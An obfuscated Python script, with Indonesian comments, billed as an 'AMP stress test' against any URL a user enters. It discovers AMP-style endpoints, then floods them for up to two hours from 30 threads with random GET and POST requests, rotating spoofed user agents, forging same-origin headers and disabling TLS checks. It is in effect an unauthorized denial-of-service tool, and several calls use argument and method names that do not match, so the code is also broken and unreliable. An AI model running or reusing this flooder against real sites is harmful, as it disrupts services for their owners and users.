lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII = Exception, print, input, range, KeyboardInterrupt, bool, __name__, int

from requests.packages.urllib3 import disable_warnings as lIlllIIllllIII
from time import sleep as IIIIIlIlllIlIl, time as IIlllIllIIIIlI
from random import choice as lIIlIIlllIIlll, uniform as lIlIllIllllIlI
from requests import post as IIlllIlIIIIllI, get as IlIlIlIllIllIl, head as llIlIlllIIlIlI
from concurrent.futures import ThreadPoolExecutor as lllllIIIlIlllI
from requests.exceptions import RequestException as lIlIlIIlllIIII
from urllib3.exceptions import InsecureRequestWarning as lIIlIlIlllIIlI
lIlllIIllllIII(lIIlIlIlllIIlI)

class IlIllIIIlIlIlIIIII:

    def __init__(IIIIIIllIIlIlllIll):
        IIIIIIllIIlIlllIll.llIlIllIlIllllIllI = ['Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36']
        IIIIIIllIIlIlllIll.IllllllIIIlIlIlIII = {'Accept': 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/json', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'AMP-Same-Origin': 'true', 'AMP-Cache-Transform': 'google;v="1"'}
        IIIIIIllIIlIlllIll.llIIllIlllllIlIllI = ['amp/', '?amp=1', '?amp', '/amp/api/v0/', 'amp/viewer', 'amp-cache/', 'amp/live-list/', 'amp-analytics/', 'amp-access/', 'amp-story/', 'amp-bind/', 'amp-form/']
        IIIIIIllIIlIlllIll.IIIIlllllIIlllIlII = {'analytics_test': {'requestOrigin': 'amp', 'eventType': 'visible', 'timestamp': llllllllllllIII(IIlllIllIIIIlI())}, 'form_test': {'_amp_source_origin': 'null', 'clientId': 'amp-test', 'formData': {'test': 'data'}}}

    def lllIlIIllIlllIIIlI(IIIIIIllIIlIlllIll):
        return lIIlIIlllIIlll(IIIIIIllIIlIlllIll.llIlIllIlIllllIllI)

    def IllllIIIllllIlIllI(IIIIIIllIIlIlllIll, lIIIIIIIIlIlIIlIIl, IlllIIIlIllllIIIII):
        """Verifikasi ketersediaan endpoint AMP"""
        llllIIIlIIllIllllI = f"{lIIIIIIIIlIlIIlIIl.rstrip('/')}/{IlllIIIlIllllIIIII.lstrip('/')}"
        try:
            IIIlllIIlllIIlIIII = llIlIlllIIlIlI(llllIIIlIIllIllllI, headers={'User-Agent': IIIIIIllIIlIlllIll.lllIlIIllIlllIIIlI(), 'AMP-Same-Origin': 'true'}, timeout=3, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            return 200 <= IIIlllIIlllIIlIIII.status_code < 404
        except:
            return llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

    def IIIlllIIllIlIIIllI(IIIIIIllIIlIlllIll, lIIIIIIIIlIlIIlIIl):
        """Menemukan endpoint AMP yang valid"""
        llllllllllllllI('[INFO] Discovering valid AMP endpoints...')
        lllIlIIIIlllllIlll = []
        IIllIIllllIIIIIIlI = ['amp-analytics/ping', 'amp-story-player', 'amp-subscriptions/', 'amp-geo/', 'amp-consent/', 'amp-experiment/', 'amp-state/', 'amp-list/', 'amp-selector/', 'amp-carousel/']
        IIIIIIllIIlIlllIll.llIIllIlllllIlIllI.extend(IIllIIllllIIIIIIlI)
        for IlllIIIlIllllIIIII in IIIIIIllIIlIlllIll.llIIllIlllllIlIllI:
            if IIIIIIllIIlIlllIll.IllllIIIllllIlIllI(lIIIIIIIIlIlIIlIIl, IlllIIIlIllllIIIII):
                llllllllllllllI(f'[SUCCESS] Found valid AMP endpoint: {IlllIIIlIllllIIIII}')
                lllIlIIIIlllllIlll.append(IlllIIIlIllllIIIII)
        if not lllIlIIIIlllllIlll:
            llllllllllllllI('[WARNING] No valid AMP endpoints found. Using default endpoints.')
            return IIIIIIllIIlIlllIll.llIIllIlllllIlIllI
        return lllIlIIIIlllllIlll

    def lIlllllIIIIlllIllI(IIIIIIllIIlIlllIll, IIIllIlIllIIIIIlll, lIIIIIIIIlIlIIlIIl, IlllIIIlIllllIIIII, IlIIllIlIIIlllIIll=None):
        llllIIIlIIllIllllI = f"{lIIIIIIIIlIlIIlIIl.rstrip('/')}/{IlllIIIlIllllIIIII.lstrip('/')}"
        IIIIIIllIIlIlllIll.IllllllIIIlIlIlIII['User-Agent'] = IIIIIIllIIlIlllIll.lllIlIIllIlllIIIlI()
        IIllIlIIIIllllIIll = {'AMP-Cache-Transform': 'google;v="1"', 'AMP-Same-Origin': 'true', 'Origin': lIIIIIIIIlIlIIlIIl, 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty'}
        IIIIIIllIIlIlllIll.IllllllIIIlIlIlIII.update(IIllIlIIIIllllIIll)
        try:
            if IIIllIlIllIIIIIlll.upper() == 'GET':
                IIIlllIIlllIIlIIII = IlIlIlIllIllIl(llllIIIlIIllIllllI, headers=IIIIIIllIIlIlllIll.IllllllIIIlIlIlIII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            else:
                if IlIIllIlIIIlllIIll:
                    IlIIllIlIIIlllIIll.update({'_amp_source_origin': lIIIIIIIIlIlIIlIIl, 'ampViewerHost': 'cdn.ampproject.org'})
                IIIlllIIlllIIlIIII = IIlllIlIIIIllI(llllIIIlIIllIllllI, json=IlIIllIlIIIlllIIll, headers=IIIIIIllIIlIlllIll.IllllllIIIlIlIlIII, timeout=5, verify=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), allow_redirects=llllllllllllIlI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
            if IIIlllIIlllIIlIIII.status_code in [404, 403]:
                return None
            llllllllllllllI(f'[{IIIlllIIlllIIlIIII.status_code}] {IIIllIlIllIIIIIlll} {llllIIIlIIllIllllI}')
            return IIIlllIIlllIIlIIII.text if IIIlllIIlllIIlIIII.ok else None
        except lIlIlIIlllIIII as IlIlIlIlIIIlIllIll:
            llllllllllllllI(f'[ERROR] {IIIllIlIllIIIIIlll} {llllIIIlIIllIllllI}: {IlIlIlIlIIIlIllIll}')
            return None

    def IlllIIlIIIlllllllI(IIIIIIllIIlIlllIll, lIIIIIIIIlIlIIlIIl, IllIIlIIIIlIlllIII=10, IIIlllIllllIlIlIlI=60):
        llllllllllllllI(f'[INFO] Starting AMP stress test on {lIIIIIIIIlIlIIlIIl} for {IIIlllIllllIlIlIlI}s with {IllIIlIIIIlIlllIII} threads')
        lllIlIIIIlllllIlll = IIIIIIllIIlIlllIll.IIIlllIIllIlIIIllI(lIIIIIIIIlIlIIlIIl)
        if not lllIlIIIIlllllIlll:
            llllllllllllllI('[ERROR] No valid AMP endpoints found. Aborting test.')
            return
        IIIIIIllIIlIlllIll.llIIllIlllllIlIllI = lllIlIIIIlllllIlll
        llIllIlIIIlIIlIllI = IIlllIllIIIIlI()

        def llllIIIIlIIlIIlllI():
            while IIlllIllIIIIlI() - llIllIlIIIlIIlIllI < IIIlllIllllIlIlIlI:
                IlllIIIlIllllIIIII = lIIlIIlllIIlll(IIIIIIllIIlIlllIll.llIIllIlllllIlIllI)
                IIIllIlIllIIIIIlll = lIIlIIlllIIlll(['GET', 'POST'])
                lIllIlIIlIlIIIIIIl = IIIIIIllIIlIlllIll.IIIIlllllIIlllIlII.get('analytics_test') if IIIllIlIllIIIIIlll == 'POST' else None
                lIIIlIIIIIlllIllII = IIIIIIllIIlIlllIll.lIlllllIIIIlllIllI(IIIllIlIllIIIIIlll, lIIIIIIIIlIlIIlIIl, IlllIIIlIllllIIIII, data=lIllIlIIlIlIIIIIIl)
                if lIIIlIIIIIlllIllII:
                    IIIIIlIlllIlIl(lIlIllIllllIlI(0.1, 0.3))
                else:
                    IIIIIlIlllIlIl(lIlIllIllllIlI(0.5, 1.0))
        with lllllIIIlIlllI(max_workers=IllIIlIIIIlIlllIII) as IlIIlIlIIllIlIIIlI:
            IIlIIIIlIIIIlIllII = [IlIIlIlIIllIlIIIlI.submit(llllIIIIlIIlIIlllI) for IIIlllIllllIIlIllI in lllllllllllllII(IllIIlIIIIlIlllIII)]
            for lIIllIIlIllllIIllI in IIlIIIIlIIIIlIllII:
                lIIllIIlIllllIIllI.lIIIlIIIIIlllIllII()

def llIlIlIlllllIlIlIl():
    llIIIIIIIIllIlIIII = lllllllllllllIl('Enter target AMP URL (e.g., https://example.com): ').strip()
    if not (llIIIIIIIIllIlIIII.startswith('http://') or llIIIIIIIIllIlIIII.startswith('https://')):
        llllllllllllllI('[ERROR] Invalid URL. Please include http:// or https://')
        return
    try:
        IlIlIllIIllIllIlIl = IlIllIIIlIlIlIIIII()
        IlIlIllIIllIllIlIl.IlllIIlIIIlllllllI(llIIIIIIIIllIlIIII, workers=30, duration=7200)
    except llllllllllllIll:
        llllllllllllllI('\n[INFO] Test interrupted by user.')
    except lllllllllllllll as IlIlIlIlIIIlIllIll:
        llllllllllllllI(f'[ERROR] Unexpected error occurred: {IlIlIlIlIIIlIllIll}')
if llllllllllllIIl == '__main__':
    llIlIlIlllllIlIlIl()
